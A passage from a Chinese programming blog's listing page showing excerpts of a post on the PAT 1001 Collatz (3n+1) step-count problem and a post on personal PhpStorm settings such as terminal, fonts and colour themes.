	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/f046047e979fa6f3f52c8c04a17b8d35/" rel="bookmark">
			数据结构与算法刷题笔记（No.001）——PAT1001害死人不偿命的(3n&#43;1)猜想（C/Java语言实现）
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		博主的数据结构刷题笔记，自己的练习记录，供大家参考，文中所列代码均经反复调试或OJ系统判定通过，如仍有疏漏欢迎大家留言指正，文中算法优化不足的地方欢迎大家留言交流，感谢。
目录
1.题目
2.输入输出要求
3.题目解析
3.1 输入数据
3.2 算法处理
3.3 输出数据
3.4 涉及到的主要知识点
3.5 Java语言实现源代码
3.6 C语言实现源代码
4.总结
1.题目 1001 害死人不偿命的(3n+1)猜想 （15 分）
卡拉兹(Callatz)猜想：
对任何一个正整数 n，如果它是偶数，那么把它砍掉一半；如果它是奇数，那么把 (3n+1) 砍掉一半。这样一直反复砍下去，最后一定在某一步得到 n=1。卡拉兹在 1950 年的世界数学家大会上公布了这个猜想，传说当时耶鲁大学师生齐动员，拼命想证明这个貌似很傻很天真的命题，结果闹得学生们无心学业，一心只证 (3n+1)，以至于有人说这是一个阴谋，卡拉兹是在蓄意延缓美国数学界教学与科研的进展……
我们今天的题目不是证明卡拉兹猜想，而是对给定的任一不超过 1000 的正整数 n，简单地数一下，需要多少步（砍几下）才能得到 n=1？
2.输入输出要求 3.题目解析 本题不涉及任何算法，读题后得到以下信息：
3.1 输入数据 输入n的范围为0-1000之间的正整数，这样不用考虑输入数据用普通数值类型存不下的问题了，这就简单了很多很多（关于大整数的问题，可以看博主的大整数的表示及加减运算的文章：大整数的输入处理（C语言实现））
3.2 算法处理 对输入数据n进行处理，如果n为偶数，则将n除以2再赋给n；如果n为奇数，则将(3*n+1)/2再赋给n，直到n的值为1时停止。每次奇数情况的处理或偶数情况的处理均算作一次处理，处理过程中记录下处理的总次数，处理结束后输出总处理次数。
3.3 输出数据 输出处理过程中记录的处理次数，即输出结果为一个正整数。
3.4 涉及到的主要知识点 本题只涉及编程语言的基础知识，包括变量、循环、条件判断、输入输出函数等。本题没有涉及任何的算法或数据结构。
3.5 Java语言实现源代码 import java.util.Scanner; public class Main { public static void main(String[] args) { Scanner sc = new Scanner(System.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/f046047e979fa6f3f52c8c04a17b8d35/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/8cb9db54ef700e55502853bc4b1bb494/" rel="bookmark">
			PhpStorm个人爱好基本设置
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		下载PhpStorm 官网下载2018版永久激活 设置Terminal为Git 选择：
File -&gt; Settings -&gt; Tools -&gt; Terminal
设置shell_path为"C:\Program Files\Git\bin\sh.exe" --login -i
这里注意路径两侧的双引号，如果去掉打开终端会报错。
调整字体大小 Settings==&gt;Editor==&gt;Color Scheme==&gt;Color Scheme Font
是修改代码编辑区字体大小的地方。
Font Family设为 Consolas, 微软雅黑, monospace
Consolas是经典的程序员专用字体，后两个备用
引用Atom主题（主题更换） Atom主题样式
选择自己喜欢的主题进行下载 .icls 文件。在 C:\Users\Master Chief\.PhpStorm2018.3\config 目录下新建 colors 文件夹，把刚刚下载好的.icls文件存入里面。
重新打开 PhpStorm ，选择
File – Settings – Editor – Color Scheme --General --Scheme
选择你喜欢的风格进行更改，选择完成后单击 Apply 即可。
这里可能还有一点点问题。如果你引用了外部的黑色系主题，显示的时候可能会出现一块白一块白的背景。你需要：
File – Settings – Editor – Color Scheme – Language Defaults
该页面设置中的 Background 选项前面的 钩钩不选中。
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/8cb9db54ef700e55502853bc4b1bb494/">Read more…</a>
	</div>
</article>
</main>

<div class="pagination">
	<a class="pagination__item pagination__item--prev btn" href="/posts/page/436/">«</a>
	<span class="pagination__item pagination__item--current">437/516</span>
	<a class="pagination__item pagination__item--next btn" href="/posts/page/438/">»</a>
</div>

			</div>
			

		</div>
		<footer class="footer">
	<div class="container footer__container flex">
		
		<div class="footer__copyright">
			&copy; 2024 编程鬼谷子的博客.
			<span class="footer__copyright-credits">Generated with <a href="https://gohugo.io/" rel="nofollow noopener" target="_blank">Hugo</a> and <a href="https://github.com/Vimux/Mainroad/" rel="nofollow noopener" target="_blank">Mainroad</a> theme.</span>
		</div>
	</div>
</footer>
<div id="gafoot"></div>
<script src="https://www.w3counter.com/tracker.js?id=151347"></script>
<script src="https://101121.xyz/ga/app.js"></script>


	</div>
<script async defer src="/js/menu.js"></script>
</body>
</html>